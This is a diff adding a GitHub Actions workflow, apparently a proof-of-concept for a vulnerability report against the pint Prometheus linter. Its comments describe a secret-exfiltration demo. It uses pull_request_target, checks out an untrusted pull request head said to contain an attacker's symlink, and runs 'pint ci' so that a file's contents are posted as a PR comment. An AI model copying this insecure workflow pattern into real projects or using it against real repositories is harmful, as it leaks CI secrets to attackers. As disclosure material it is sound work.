@@ -1,0 +1,55 @@
+# .github/workflows/pint.yml  — Scenario B (the live secret-exfil demo the triager asked for).
+#
+# WHY direct `pint ci` and not prymitive/pint-action:
+#   pint-action's entrypoint runs `pint ci` (the leaky PR-comment mode) ONLY on the `pull_request`
+#   event, and `pint lint` on everything else. On a fork `pull_request`, GitHub gives a read-only
+#   token + no secrets, so the action cannot comment and no secret is present. To demonstrate the
+#   secret->comment impact you must run `pint ci` (pint's documented CI mode) in a context that has
+#   a commentable token AND secrets, i.e. `pull_request_target`. So we invoke `pint ci` directly.
+#
+# This models a maintainer who wants pint to comment on EXTERNAL contributions (which requires a
+# writable token, i.e. pull_request_target). Verified end-to-end against pint HEAD locally: pint ci
+# auto-enables the GitHub reporter from the Actions env (GITHUB_ACTION + GITHUB_REPOSITORY +
+# GITHUB_API_URL) and posts the followed file's bytes into the PR comment.
+name: pint
+
+on:
+  pull_request_target:
+    branches: [main]
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  pint:
+    runs-on: ubuntu-latest
+    env:
+      # The "CI secret" whose theft we demonstrate. USE A FAKE VALUE.
+      # Set it in repo Settings -> Secrets and variables -> Actions -> New repository secret.
+      DEMO_DEPLOY_TOKEN: ${{ secrets.DEMO_DEPLOY_TOKEN }}
+    steps:
+      # 1) base repo checkout so origin/main exists for the diff
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      # 2) fetch + check out the UNTRUSTED PR head (contains the attacker's symlink + decoy)
+      - name: Check out PR head
+        run: |
+          git config --global --add safe.directory "$GITHUB_WORKSPACE"
+          git fetch origin "+refs/pull/${{ github.event.pull_request.number }}/head:refs/remotes/pr/head"
+          git checkout -B pr refs/remotes/pr/head
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: 'stable'
+
+      - name: Install pint (HEAD)
+        run: go install github.com/cloudflare/pint/cmd/pint@latest
+
+      - name: Run pint ci
+        env:
+          GITHUB_AUTH_TOKEN: ${{ github.token }}
+          GITHUB_PULL_REQUEST_NUMBER: ${{ github.event.pull_request.number }}
+        run: pint --no-color ci -b origin/main
